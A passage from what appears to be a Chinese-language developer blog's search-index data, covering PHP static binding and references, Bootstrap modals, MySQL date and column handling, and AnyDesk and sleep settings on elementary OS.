繼承踩雷 | 程式狂想筆記](https://malagege.github.io/blog/2018/08/14/java-method-%E9%A1%9E%E5%88%A5%E6%88%90%E5%93%A1-class-member-%E7%B9%BC%E6%89%BF%E8%B8%A9%E9%9B%B7/)\n\n```php\n\n<?php\nclass A {\n    public static function who() {\n        echo __CLASS__;\n    }\n    public static function test() {\n        self::who();\n    }\n}\n\nclass B extends A {\n    public static function who() {\n        echo __CLASS__;\n    }\n}\n\nB::test();  #A\n?>\n```\n\n### static\n\n## Late Static Bindings(后期静态绑定)\n\nstatic 跟 get_called_class()方法一樣，他是指實例後物件位置\n\n```php\n\n<?php\nclass A {\n    public static function who() {\n        echo __CLASS__;\n    }\n    public static function test() {\n        static::who(); // 后期静态绑定从这里开始\n    }\n}\n\nclass B extends A {\n    public static function who() {\n        echo __CLASS__;\n    }\n}\n\nB::test(); # B\n?>\n```\n\n> 在非靜態環境下，所調用的類即為該對象實例所屬的類。由於 \\$this-> 會在同一作用範圍內嘗試調用私有方法，而 static:: 則可能給出不同結果。另一個區別是 static:: 只能用於靜態屬性。\n\n### 在非靜態環境下使用 static::\n\n> Note:\n> 在非靜態環境下，所調用的類即為該對象實例所屬的類。由於 \\$this-> 會在同一作用範圍內嘗試調用私有方法，而 static:: 則可能給出不同結果。另一個區別是 static:: 只能用於靜態屬性。\n\n事後我在網路上找到了，更詳細解說\n[PHP 中 self、static、\\$this 的区别 & 后期静态绑定详解 - 彳亍 - CSDN 博客](https://blog.csdn.net/lamp_yang_3533/article/details/79912453)\n{% asset_link 1.png 備份圖 %}\n老實說這篇寫很亂了 orz\n\n```\n注意事项\n非静态环境下的私有方法的查找顺序\n\n在非静态环境下，在类的非静态方法中，使用 $this 和 static 调用类的私有方法时，执行方式有所不同。\n\n    $this 会优先寻找所在定义范围（父类）中的私有方法，如果存在就调用。\n    static 是先到它指向的类（子类）中寻找私有方法，如果找到了就会报错，因为私有方法只能在它所定义的类内部调用；如果没找到，再去所在定义范围（父类）中寻找该私有方法，如果存在就调用。\n\n具体来说，$this 会先到所在定义范围内寻找私有方法，再到它指向的对象所属的类中寻找私有方法，然后寻找公有方法，最后到所在定义范围内寻找公共方法。只要找到了匹配的方法，就调用，并停止查找。\n\n而 static 则是先到它指向的类中寻找私有方法，再寻找共有方法；然后到所在定义范围内寻找私有方法，再寻找共有方法。只要找到了匹配的方法，就调用，并停止查找。\n---------------------\n作者：lamp_yang_3533\n来源：CSDN\n原文：https://blog.csdn.net/lamp_yang_3533/article/details/79912453\n版权声明：本文为博主原创文章，转载请附上博文链接！\n```\n\n```php\n\n<?php\nclass A {\n    private function foo() {\n        echo \"success!\\n\";\n    }\n    public function test() {\n        $this->foo();\n        static::foo(); //** C實例呼叫的時候會有問題\n    }\n}\n\nclass B extends A {\n   /* foo() will be copied to B, hence its scope will still be A and\n    * the call be successful */\n}\n\nclass C extends A {\n    private function foo() {\n        /* original method is replaced; the scope of the new one is C */\n    }\n}\n\n$b = new B();\n$b->test();\n$c = new C();\n$c->test();   //fails\n\n// success!\n// success!\n// success!\n// <br />\n// <b>Fatal error</b>:  Uncaught Error: Call to private method C::foo() from context 'A' in [...][...]:9\n// Stack trace:\n// #0 [...][...](27): A-&gt;test()\n// #1 {main}\n//   thrown in <b>[...][...]</b> on line <b>9</b><br />\n\n\n// PHP 5\n// Fatal error:  Call to private method C::foo() from context 'A' in /tmp/test.php on line 9\n?>\n\n\n```\n\n> Late static bindings' resolution will stop at a fully resolved static call with no fallback. On the other hand, static calls using keywords like parent:: or self:: will forward the calling information.\n\n```php\n<?php\nclass A {\n    public static function foo() {\n        static::who();// (2) 遇到後期靜態綁定\n    }\n\n    public static function who() {\n        echo __CLASS__.\"\\n\";\n    }\n}\n\nclass B extends A {\n    public static function test() {\n        A::foo();// 這不是轉發 (1)\n        parent::foo();// 這是轉發 (1)\n        self::foo();//   這是轉發 (1)\n        static::foo();// 這是轉發 (1)\n    }\n\n    public static function who() {\n        echo __CLASS__.\"\\n\";\n    }\n}\nclass C extends B {\n    public static function who() {\n        echo __CLASS__.\"\\n\";\n    }\n}\n\nC::test();\n// A\n// C\n// C\n// C\n\n// A\n// C\n// C\n// C\n?>\n```\n\n```php\n<?php\nclass A {\n    public static function foo() {\n        static::who();//\n    }\n\n    public static function who() {\n        echo __CLASS__.\"\\n\";  //這個不是後期靜態綁定\n    }\n}\n\nclass B extends A {\n    public static function test() {\n        A::who();// 這不是轉發\n        parent::who();// 這是轉發\n        self::who();// 這是轉發\n        static::who();// 這是轉發\n    }\n\n    public static function who() {\n        echo __CLASS__.\"\\n\";\n    }\n}\nclass C extends B {\n    public static function who() {\n        echo __CLASS__.\"\\n\";\n    }\n}\n$c = new C;\n$c->test();\nC::test();\n// A\n// A\n// B\n// C\n\n// A\n// A\n// B\n// C\n?>\n```\n\n老實說上面例子花我很多時間想的，重寫兩次文章(因為一直發現理解錯誤)\n只要進入 B 的 parent,static,self 再跳到 A 的 test function 裡面的`static::who();`(後期靜態綁定)\n就會抓當下 class\n不管是`實例`或者 `static`\n都會印出 C\n\n---\n\n下面是直接在 B 的 test()做，第一次的時候做轉發，跳到下一個 function \\*_沒有_`用後期靜態綁定`\n而且\\_\\_CLASS\\_\\_(self)，只會抓到原本的類別(非實例出來的類別)\n\n這邊的 static 轉發(forward)同等於`forward_static_call()`\n所以下面這個範例，\\_\\_CLASS\\_\\_改成`get_called_class()`一樣會變成上面結果一致\n\n- [PHP: forward_static_call - Manual](http://php.net/manual/zh/function.forward-static-call.php)\n\n## forward_static_call 和 call_user_func\n\n這兩個 function 功能很像，但差在用在 static 地方。\n重點是下面這兩個`call_user_func('A::bar'); //non-forwarding, 'A'`和`forward_static_call('A::bar'); //forwarding, 'B'`\n這兩個讓我想到 JavaScript 閉包用到(this)這個東西，但 js 解決方法是用`箭頭函式`和`var that = this`解決(題外話，請忽略這段)\n\n但 forward_static_call 有一個例外，當父類別到子類別的話，不做轉發動做，看下面範例\n\n[php 5.3 - PHP forward_static_call vs call_user_func - Stack Overflow](https://stackoverflow.com/questions/5061476/php-forward-static-call-vs-call-user-func)\n\n```\nThe difference is just that forward_static_call does not reset the \"called class\" information if going up the class hierarchy and explicitly naming a class, whereas call_user_func resets the information in those circumstances (but still does not reset it if using parent, static or self).\n\nExample:\n\n<?php\nclass A {\n    static function bar() { echo get_called_class(), \"\\n\"; }\n}\nclass B extends A {\n    static function foo() {\n        parent::bar(); //forwards static info, 'B'\n        call_user_func('parent::bar'); //forwarding, 'B'\n        call_user_func('static::bar'); //forwarding, 'B'\n        call_user_func('A::bar'); //non-forwarding, 'A'\n        forward_static_call('parent::bar'); //forwarding, 'B'\n        forward_static_call('A::bar'); //forwarding, 'B'\n    }\n}\nB::foo();\n\nNote that forward_static_call refuses to forward if going down the class hierarchy:\n\n<?php\nclass A {\n    static function foo() {\n        forward_static_call('B::bar'); //non-forwarding, 'B'\n    }\n}\nclass B extends A {\n    static function bar() { echo get_called_class(), \"\\n\"; }\n}\nA::foo();\n\nFinally, note that forward_static_call can only be called from within a class method.\n\n```\n\nThe difference is just that forward_static_call does not reset the \"called class\" information if going up the class hierarchy and explicitly naming a class, whereas call_user_func resets the information in those circumstances (but still does not reset it if using parent, static or self).\n\n最後我覺得 static 和\\$this 很相似\n但看到這篇裡面有寫差異\n雖然我有一點 Java 物件導向觀念，但是 PHP 物件導向還滿難理解\n\n```\nstatic 和 $this 有点类似，但又有区别：\n\n    $this 指向的对象所属的类和 static 指向的类相同。\n    $this 不能用于静态方法中，也不能访问类的静态属性和常量。\n    $this 指向的是实际调用的对象。\n    static 可以用于静态或非静态方法中，也可以访问类的静态属性、静态方法、常量和非静态方法，但不能访问非静态属性。\n    static 指向的是实际调用时的对象所属的类。\n---------------------\n作者：lamp_yang_3533\n来源：CSDN\n原文：https://blog.csdn.net/lamp_yang_3533/article/details/79912453\n版权声明：本文为博主原创文章，转载请附上博文链接！\n```\n\n## 參考來源\n\n- [PHP 的 static 與 self 兩個關鍵字的差異 | Asika Lab 飛鳥實驗室](http://asika.windspeaker.co/post/3483-php-static-self)\n- [PHP: Late Static Bindings - Manual](http://php.net/manual/en/language.oop5.late-static-bindings.php)\n- [PHP: forward_static_call - Manual](http://php.net/manual/zh/function.forward-static-call.php)\n- [PHP forward_static_call vs call_user_func | landcareweb.com](http://landcareweb.com/questions/30864/php-forward-static-call-vs-call-user-func)\n- [PHP 5.3/6 新增功能 - Late Static Bindings - 石頭閒語](http://rocksaying.tw/archives/10796755.html)\n- [php 5.3 - PHP forward_static_call vs call_user_func - Stack Overflow](https://stackoverflow.com/questions/5061476/php-forward-static-call-vs-call-user-func)\n- [PHP forward_static_call 和 call_user_func - 代码日志](https://codeday.me/bug/20181023/313202.html)\n- [PHP: forward_static_call - Manual](http://php.net/manual/zh/function.forward-static-call.php)\n- [PHP 关于 self:: 和 static:: | 随意博客](http://www.cleey.com/blog/single/id/854.html)\n- [通过 static 关键词来实现 late static binding（静态调用绑定）-pilishen.com,做全球最好的实战教程](http://www.pilishen.com/posts/php-late-static-bindings-in-laravel)\n- [[PHP 觀念]self 和\\$this 的差異 @ 麥克的學習紀錄 :: 痞客邦 ::](http://miggo.pixnet.net/blog/post/30799978-%5Bphp%E8%A7%80%E5%BF%B5%5Dself%E5%92%8C%24this%E7%9A%84%E5%B7%AE%E7%95%B0)\n","tags":["static"],"categories":["PHP"]},{"title":"Bootstrap 不知道Modal一些事筆記","url":"%2Fblog%2F2019%2F02%2F19%2FBootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98%2F","content":"\n說真的平常只用 Boostrap 基本東西\n很少深入研究這個東西\n今天看到一段程式\n感覺 Bootstrap 值得深入研究\n\n<!--more-->\n\n## remote (v4 以廢棄)\n\n```html\n<a data-toggle=\"modal\" href=\"remote.html\" data-target=\"#modal\">Click me</a>\n```\n\n可以呼叫`remote.html`到`#modal`裡面去\n沒錯我當初看到的時候\n覺得很神奇\n跑去官網文件都沒有找到\n結果查看了一下 v3\n\n> This option is deprecated since v3.3.0 and has been removed in v4. We recommend instead using client-side templating or a data binding framework, or calling jQuery.load yourself\n\n這麼好用的功能...，怎麼要廢棄掉???\n[Bootstrap 3 with remote Modal - Stack Overflow](https://stackoverflow.com/questions/18378720/bootstrap-3-with-remote-modal)\n所以之後可能需要用 jQuery.load 手動載入方式\n\n### 神奇清除 remote 表單\n\n```js\n$(\"#myModal\").on(\"hidden.bs.modal\", function() {\n  $(this).removeData(\"bs.modal\");\n});\n```\n\n[Plunker](http://plnkr.co/edit/HWSgSw?p=preview)\n其實仔細觀察，開發者工具看，他會重新載入網頁\n所以值都是一開始的樣子\n\n有時候還會失敗，最好的方式就是\n\n不過這個方法，只能適用在 remote\n所以網路上只看到 v2,v3\n但沒有看到 v4\n\n## 修改表單小技巧\n\n[Modal · Bootstrap](https://getbootstrap.com/docs/4.3/components/modal/)\n\n平常我們重開 modal，打開兩次，第一次修改，直接取消，第二次打開後可能是第一次修改取消的值\n原本 remote 方式可以輕鬆解決\n但是網路上有找到用`data-*`方式去紀錄\n\n[Correct approach of getting dynamic values from data-attributes with jQuery](https://codepen.io/mkrl/pen/ZmWVMJ)\n\n```html\n<button\n  type=\"button\"\n  id=\"btn1\"\n  class=\"btn btn-primary\"\n  data-toggle=\"modal\"\n  data-target=\"#exampleModal\"\n  data-title=\"Post 1\"\n>\n  Edit\n</button>\n\n<div\n  class=\"modal fade\"\n  id=\"exampleModal\"\n  tabindex=\"-1\"\n  role=\"dialog\"\n  aria-labelledby=\"exampleModalLabel\"\n  aria-hidden=\"true\"\n>\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <h5 class=\"modal-title\" id=\"exampleModalLabel\">New message</h5>\n        <button\n          type=\"button\"\n          class=\"close\"\n          data-dismiss=\"modal\"\n          aria-label=\"Close\"\n        >\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <form>\n        <div class=\"modal-body\">\n          <div class=\"form-group\">\n            <label for=\"title\" class=\"col-form-label\">Title:</label>\n            <input type=\"text\" class=\"form-control\" id=\"title\" name=\"title\" />\n          </div>\n        </div>\n        <div class=\"modal-footer\">\n          <button type=\"button\" class=\"btn btn-secondary\" data-dismiss=\"modal\">\n            Close\n          </button>\n          <button\n            type=\"button\"\n            class=\"btn btn-primary\"\n            onClick=\"edit(this.form)\"\n          >\n            Submit\n          </button>\n        </div>\n      </form>\n    </div>\n  </div>\n</div>\n```\n\n```js\n$(\"#exampleModal\").on(\"show.bs.modal\", function(event) {\n  var button = $(event.relatedTarget);\n  var recipient = button.attr(\"data-title\");\n  var modal = $(this);\n  modal.find(\".modal-body input#title\").val(recipient);\n});\n\nfunction edit(form) {\n  var title = form.title.value;\n  ////// insert into database\n  var btn1 = document.getElementById(\"btn1\");\n  btn1.setAttribute(\"data-title\", form.title.value);\n}\n```\n\n但 Modal 還不只這樣\n有空深入研究在寫\n"},{"title":"DB存時間格式有哪些型態可以用(經驗分享)","url":"%2Fblog%2F2019%2F02%2F18%2FDB%E5%AD%98%E6%99%82%E9%96%93%E6%A0%BC%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9E%8B%E6%85%8B%E5%8F%AF%E4%BB%A5%E7%94%A8-%E7%B6%93%E9%A9%97%E5%88%86%E4%BA%AB%2F","content":"\n之前不同公司 db 使用型態都不太一樣\n前一間公司試用`varchar`\n現在是用 datetime 預設值`0000-00-00`\n最近在想這個預設值有甚麼好處\n\n<!--more-->\n\n首先，一直搞不清楚不用 Null，印象中 Null 在做 Index 不是很好\n我自己想出結論，這個可能可以優化 Index key\n'0000-00-00'大部分跟 NULL 一樣(https://dev.mysql.com/doc/refman/8.0/en/using-date.html)\n但是看到 MySQL 之後版本預設 sql_mode 有 NO_ZERO_IN_DATE,NO_ZERO_DATE\n不能使用'0000-00-00'，感覺 MySQL 官方預設都不建議用'0000-00-00'\n我有特別 Google 一下，感覺兩種都有人在用\n\n- [Datetime NULL or 0000-00-00 00:00:00 - Databases - The SitePoint Forums](https://www.sitepoint.com/community/t/datetime-null-or-0000-00-00-00-00-00/49216)\n- [mysql - default date '0000-00-00 00:00:00' or null - Stack Overflow](https://stackoverflow.com/questions/12482560/default-date-0000-00-00-000000-or-null?fbclid=IwAR3OymTlPF517hx7lWUii1rvWgoVN__N3w12Gds3L9cyyPmnzIWP8XSNfUk)\n\n感覺大多留言是偏向使用`null`\n\n不過，我有去社群問問大家[Backend 台灣 (Backend Tw)](https://www.facebook.com/groups/616369245163622/permalink/1554464451354092/)\n\n> int / timestamp/ datetime 這三種來記錄\n> 在大量資料來做搜索時(沒索引)\n> 效能是 int > UNIX_TIMESTAMP > timestamp > datetime\n> 有索引\n> 效能是 UNIX_TIMESTAMP > int > timestamp > datetime\n\n> 一般用框架的，都是 timestamp ，而且沒有就是 0，這樣子最快，只是需要轉換而已\n","tags":["mysql"],"categories":["MySQL"]},{"title":"mariadb/mysql修改欄位可能要注意的事情","url":"%2Fblog%2F2019%2F02%2F18%2Fmariadb-mysql%E4%BF%AE%E6%94%B9%E6%AC%84%E4%BD%8D%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85%2F","content":"\n最近修改 null 欄位改成非 null 欄位\n在測試環境上修改欄位通過\n但到正式環境就沒通過\n卡了很久整理一下，一些問題\n\n<!--more-->\n\n## MySQL、MariaDB\n\n在一般實作 int(null)->int(not null)~~，null 值都會自動轉乘`0`~~，舊版可能會自動轉，MySQL 8.0 不會自動轉，會報`Invalid use of NULL value` varchar,datetime(null) ->(not null)，會報錯誤 `Invalid use of NULL value`\n\n但 int 有找到下\n[MySQL alter table modify column failing at rows with null values - Stack Overflow](https://stackoverflow.com/questions/7828440/mysql-alter-table-modify-column-failing-at-rows-with-null-values)\n\n[MySQL 5.7 預設 SQL 模式帶來的問題總結 | 程式前沿](https://codertw.com/%E8%B3%87%E6%96%99%E5%BA%AB/122336/)\n[XYZ 的筆記本: MySQL 資料表分區(partition)](https://xyz.cinc.biz/2015/07/mysql-partition.html)\n\n## ignore\n\n`alter ignore table`\n[MySQL alter table modify column failing at rows with null values - Stack Overflow](https://stackoverflow.com/questions/7828440/mysql-alter-table-modify-column-failing-at-rows-with-null-values)\n不過剛剛發現 MySQL 5.7 這個就不能用了...\nMariaDB 還可以\nvarchar(null) -> 空字串\n\n還發現很奇怪的是，MySQL 到後面版本有`NO_ZERO_IN_DATE，NO_ZERO_DATE，TRADITIONAL`\n\n所以可能還是需要自己手動把 null 改成有值\n雖然`ignore`好像能處理\n但有可能會早成資料遺失的可能(修改 index)\n\n測試 sql\n\n```sql\nDROP TABLE IF EXISTS `test`;\nCREATE TABLE `test` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `a` varchar(10) DEFAULT NULL,\n  `b` int(11) DEFAULT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=latin1;\n\nINSERT INTO `test` (`id`, `a`, `b`) VALUES\n(1,\tNULL,\tNULL);\n\n-- 2019-02-18 13:06:14\n```\n\n可自己嘗試修改 a,b 欄位測試看看\n\n其他資料\n[alter ignore table 添加 unique key - 菠萝大数据梦工厂（Free World） - CSDN 博客](https://blog.csdn.net/jiangshouzhuang/article/details/43925763)\n[MySQL 刪除重複的資料,只留下一筆資料 | 我的 PHP 冒險之路](http://play-php.blogspot.com/2016/06/mysql.html)\n[MySQL 5.7 預設 SQL 模式帶來的問題總結 | 程式前沿](https://codertw.com/%E8%B3%87%E6%96%99%E5%BA%AB/122336/)\n"},{"title":"Anydesk在Linux(elementaryOS)安裝小記","url":"%2Fblog%2F2019%2F02%2F13%2FAnydesk%E5%9C%A8Linux-elementaryOS-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98%2F","content":"\n最近買 SSD 升級筆電\n重新灌了 ElementaryOS\n但發現之前 Anydesk 沒有記錄筆記\n都會一直忘記 deb 要怎麼安裝\n今天小記一下\n\n<!--more-->\n\n有爬到[手動安裝](https://help.ubuntu.com/kubuntu/desktopguide/zh_TW/manual-install.html)\n\n```\n安裝某個.deb檔案，簡單的在.deb檔案上Right單擊游標，然後選擇Kubuntu Package Menu->安裝軟體套件。\n或者，你可以在終端下輸入如下內容來安裝.deb檔案\nsudo dpkg -i 軟體套件名.deb\n卸載.deb檔案，可以使用Adept，或輸入：\nsudo apt-get remove 軟體套件名稱\n```\n\n用 dpkg 安裝沒有想到可以這樣做\n\n但有看到一種方式\n\n```bash\nsudo apt install ./anydesk_4.0.1-1_amd64.deb\n```\n\n[Command Line Interface - AnyDesk Help Center](https://support.anydesk.com/Command_Line_Interface)\n安裝完設定，目前不確定是否要執行`--start-service`\n\n```\nanydesk --start-service\nanydesk --get-status\n```\n\n可以開啟`sudo anydesk`設定一些東西\n但是設定`固定密碼`一直失敗\n\n```bash\nsudo anydesk-global-settings\n```\n\n要打上面指令才能設定\n","tags":["remoted desktop"],"categories":["實用工具"]},{"title":"ElementaryOS設定停用休眠但還是會休眠問題解決方案","url":"%2Fblog%2F2019%2F02%2F03%2FElementaryOS%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8%E4%BC%91%E7%9C%A0%E4%BD%86%E9%82%84%E6%98%AF%E6%9C%83%E4%BC%91%E7%9C%A0%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88%2F","content":"\n最近重買 SSD 重灌 ElentmaryOS 0.5 版\n發現設定 睡眠 停用\n電腦竟然還是會做睡眠\n起初我以為是設定的問題\n但我看我設定都關掉了\n這邊有找到解決方法\n\n<!--more-->\n\n## 解決 elementary os 休眠問題\n\n首先，有在[elementary OS SSD 最佳化 – 皇家工程師](https://royalprogrammer.wordpress.com/2018/01/30/ssd_optimization/)看到\n\n```\n關閉休眠 (Hibernation)\n\nelementary OS 的休眠預設是關閉的。\n\n檢查休眠是否為關閉的方式如下：\n\n在終端機執行下列指令使用 nano 編輯器打開 /var/lib/polkit-1/localauthority/10-vendor.d/com.ubuntu.desktop.pkla\n\nsudo nano /var/lib/polkit-1/localauthority/10-vendor.d/com.ubuntu.desktop.pkla\n\n[Disable hibernate by default in upower] 和 [Disable hibernate by default in logind] 下的 ResultActive 為 No 的話就代表休眠是關閉的。如果是 Yes 的話，可以自己改成 No 關閉休眠。\n```\n\n目前設定確實跟預設一模一樣\n不過睡眠(sleep mode)跟休眠(Hibernation)不太一樣\n可參考[[教學] 關機、待命、睡眠、休眠和交互式睡眠的分別 | FoolEgg.com](https://www.foolegg.com/what-are-the-differences-between-shut-down-standby-sleep-hibernate-and-hybrid-sleep/)\n\n最後找到[settings - Elementary OS ignoring suspend disable - elementary OS Stack Exchange](https://elementaryos.stackexchange.com/questions/16519/elementary-os-ignoring-suspend-disable)\n裡面[Never suspend when plugged in setting ignored (always uses battery setting for suspend) · Issue #89 · elementary/switchboard-plug-power](https://github.com/elementary/switchboard-plug-power/issues/89)有一個 Github Issue\n裡面還是 open\n看到有一個 workaround 方式\n\n```\n    sudo su\n\nenter, then your password\n\n    su - -s /bin/bash lightdm\n\nenter\n\n    dbus-launch gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type nothing\n\nenter\n\n    gsettings get org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type\n\nenter\n\nit should return 'nothing'\n```\n\n最後使用真的有效!!!\n\n## 安裝 elementaryOS 0.5 小記\n\n- 安裝 zplug 要裝 git 跟\n- 安裝 hack font 可以使用`sudo apt-get install fonts-hack`\n- picture-in-picture 使用方法是`win+f`[Picture to Picture Mode in elementary OS 5.0 Juno - YouTube](https://www.youtube.com/watch?v=6FbQzF6h8DA)\n  很羨慕嗎?其實 Chrome 內建這個功能\n  Windows 也可以用\n  只可惜沒有快捷鍵可以做隱藏\n  偶爾使用會遇到 bug，但目前無傷大雅\n\n[程序员的七种武器之 Zsh - 从 Hello World 开始](https://dingmingxin.github.io/blog/2016/05/05/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E4%B8%83%E7%A7%8D%E6%AD%A6%E5%99%A8%E4%B9%8Bzsh/#org2976e1f)\n"},{"title":"PHP有關參照(Reference)的那些事","url":"%2Fblog%2F2019%2F01%2F28%2FPHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%2F","content":"\n最近在看 PHP 官方參考文件\n一直以為 PHP 有一個指針(pointer)觀念\n今天讀到官網說「PHP 不是 reference、也不是 pinter 觀念」(雖然這樣想幾乎 87%都不會有問題)\n瞬間有點黑人問號臉\n也許是剛學時候就用這樣記住\n但是今天要好好重新認識 PHP Reference\n聽說就跟 Linux Hard Link 一樣的道理\n\n<!--more-->\n\n## PHP 參照不是指針(pointer)\n\n[PHP: 引用是什么 - Manual](http://php.net/manual/zh/language.references.whatare.php)\n\n```\n在 PHP 中引用意味著用不同的名字訪問同一個變量內容。這並不像 C 的指針：例如你不能對他們做指針運算，他們並不是實際的內存地址…… 查看引用不是什麼瞭解更多信息。 替代的是，引用是符號表別名。注意在PHP 中，變量名和變量內容是不一樣的， 因此同樣的內容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——變量名是目錄條目，而變量內容則是文件本身。引用可以被看作是 Unix 文件系統中的硬鏈接。\n```\n\n這樣看真的沒有懂\n\n直接看下面的*User Contributed Notes*人家給的範例\n\n```php\n<?php\nvar = \"foo\";\n$ref1 =& $var; // new object that references $var\n$ref2 =& $ref1; // references $var directly, not $ref1!!!!!\n\necho $ref1; // >foo\n\nunset($ref1);\n\necho $ref1; // >Notice:  Undefined variable: ref1\necho $ref2; // >foo\necho $var; // >foo\n?>\n```\n\n其實這個範例可以很簡單看出來，刪除`unset` $ref1變數不會影響到$ref2\n這個我記得在 Java 會直接 byebye\n~~JavaScript 發現不能用 delete object，看來要找天測試是為什麼~~[delete operator | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/delete)\n\n再看[PHP: 引用做什么 - Manual](http://php.net/manual/zh/language.references.whatdo.php)\n\n```php\n<?php\n$a =& $b;\n?>\n```\n\n**Note:**\n\n- $a 和 $b 在這裡是完全相同的，這並不是 $a 指向了 $b 或者相反，而是 $a 和 $b 指向了同一個地方。\n- 如果具有引用的數組被拷貝，其值不會解除引用。對於數組傳值給函數也是如此。\n\n## 參照\n\n```php\n<?php\n\n$a = 1;\n$b = &$a;\n$b++;\n$c = $b;\n$a = 0;\nvar_dump($c);   #2\n```\n\n```php\n<?php\n\n$a = 1;\n$b = &$a;\n$b++;\n$c = &$b;\n$a = 0;\nvar_dump($c);   #0\n```\n\n## 官網神奇的範例...\n\n如果對一個未定義的變量進行引用賦值、引用參數傳遞或引用返回，則會自動創建該變量。\n這一段真的很神奇...，不過應該是 function 會宣告上面的變數。\n\n```php\n<?php\nfunction foo(&$var) { }\n\nfoo($a); // $a is \"created\" and assigned to null\n\n$b = array();\nfoo($b['b']);\nvar_dump(array_key_exists('b', $b)); // bool(true)\n\n$c = new StdClass;\nfoo($c->d);\nvar_dump(property_exists($c, 'd')); // bool(true)\n?>\n```\n\n## 官方下面的範例\n\n**_以下有毒，假如理解不能請不要再深入，有可能會走火入魔_**\n**_以下有毒，假如理解不能請不要再深入，有可能會走火入魔_**\n**_以下有毒，假如理解不能請不要再深入，有可能會走火入魔_**\n\n目前簡單用我想的方法\n`沒有用&`當做`copy覆蓋到當前(箭頭)位置的值`\n`用&`當作`這個變數(箭頭)重新指向到某一個位置`(跟 linux hard link 一樣)\n以下注解是我用自已方法去記錄的，有錯誤也請不要見怪\n\n```php\n<?php\n//if you do:\n\n$a = \"hihaha\";\n$b = &$a;\n$c = \"eita\";\n$b = $c;\necho $a; // shows \"eita\"\n\n# $b指向為$a位置，$b的位置改當然$a也會跟著換\n\n$a = \"hihaha\";\n$b = &$a;\n$c = \"eita\";\n$b = &$c;\necho $a; // shows \"hihaha\"\n\n#  **這邊是重點**\n#  $b範例都是參照位置\n#  其實很容易被Java Reference帶著走\n\n$a = \"hihaha\";\n$b = &$a;\n$b = null;\necho $a; // shows nothing (both are set to null)\n\n$a = \"hihaha\";\n$b = &$a;\nunset($b);\necho $a; // shows \"hihaha\"\n?>\n```\n\n2019-02-20 簡單小記\n`$b`值為=右邊變數的值(先不管有沒有&)\n當然不一樣的結果在於前面的`$b=&`\n\n## 用自已的方法手畫上面前四個範例\n\n{% asset_img 1-1.png 範例1 %}\n{% asset_img 1-2.png 範例2 %}\n{% asset_img 1-3.png 範例3 %}\n{% asset_img 1-4.png 範例4 %}\n\n簡單來說，我有一個方法不會搞混\n首先，分兩部份\n第一部份是 變數名字\n第二部份是 記錄框框資料\n兩個部份會有一個箭頭做關連\n\n```php\n<?php\n$a = 1;\n$b = $a;\n```\n\n平常給值是\n{% asset_img 1-5.png 範例5 %}\n\n## PHP5 new 物件預設是參照\n\n`自 PHP 5 起，new 自动返回引用，因此在此使用 =& 已经过时了并且会产生 E_STRICT 级别的消息。`\n\n## Global 變數使用參照\n\n百思不得其解的範例，官方有說明`global $var; 是 $var =& $GLOBALS['var']; 的簡寫。`\n但要熟悉上面規則，就能理解下方程式為什麼不會影響外面的`$var2`(全域變數)\n這可能沒有深入了解 PHP 參照，可能會很難理解\n下範例外面的 Global 使用參照，卻不會影響全域變數\n\n```php\n<?php\n$var1 = \"Example variable\";\n$var2 = \"\";\n\nfunction global_references($use_globals)\n{\n    global $var1, $var2;\n    if (!$use_globals) {\n        $var2 =& $var1; // visible only inside the function\n        echo 'var2:'  . $var2 . ',' . $GLOBALS[\"var2\"]. PHP_EOL;\n    } else {\n        $GLOBALS[\"var2\"] =& $var1; // visible also in global context\n    }\n}\n\nglobal_references(false);\necho \"var2 is set to '$var2'\\n\"; // var2 is set to ''\nglobal_references(true);\necho \"var2 is set to '$var2'\\n\"; // var2 is set to 'Example variable'\n?>\n\n```\n\n這個範例其實跟上一個例子一樣\n其實他是參照到別的地方\n\n話說我剛好也不是很了解 php global\n趁這個機會了解\n\n[PHP: What References Are Not - Manual](http://php.net/manual/en/language.references.arent.php)\n原 function 的$var是參照$bar\n但是$var =& $GLOBALS[\"baz\"];\n簡單來說\n\n```php\n<?php\nfunction foo(&$var)\n{\n    $var =& $GLOBALS[\"baz\"];\n}\nfoo($bar);\n?>\n\n```\n\n這邊用 global 感覺容易混淆\n\n```php\n<?php\n        //Enter your code here, enjoy!\n$bar = 1;\nfunction foo(&$var)\n{\n    $a = 2;\n    $var =& $a;\n}\nfoo($bar);\necho $bar;  #1\n```\n\n感覺`foo(&$var)`使用上等於`區域變數 $var = & 全域變數 $bar`($var = &$GLOBAL['bar'])\n所以到最後重新指向位置並不會影響\\$bar\n\n## Returning References\n\n```php\n\n<?php\nclass foo {\n    public $value = 42;\n\n    public function &getValue() {\n        return $this->value;\n    }\n}\n\n$obj = new foo;\n$myValue = &$obj->getValue(); // $myValue is a reference to $obj->value, which is 42.\n$obj->value = 2;\necho $myValue;                // prints the new value of $obj->value, i.e. 2.\n?>\n```\n\n簡單來說，Returning References 用在物件導向需要兩個`&`\n\n最近看 Codeigiter 原程式有用`function &xxxx`\n一直在想這個為什麼要這樣用...\n在想是不是之後會帶入到 function，防止不是參照(以下自己猜測，但後來想想好像不是，看看就好= =a)\n讓 functiont 產生`Only variables should be passed by reference`(詳細請看下面內容)\n不過有在官網看到[PHP: 變量範圍 - Manual](http://php.net/manual/zh/language.variables.scope.php#language.variables.scope.static)\n目前還不確定是不是這個關係\n\n> 在 Zend 引擎 1 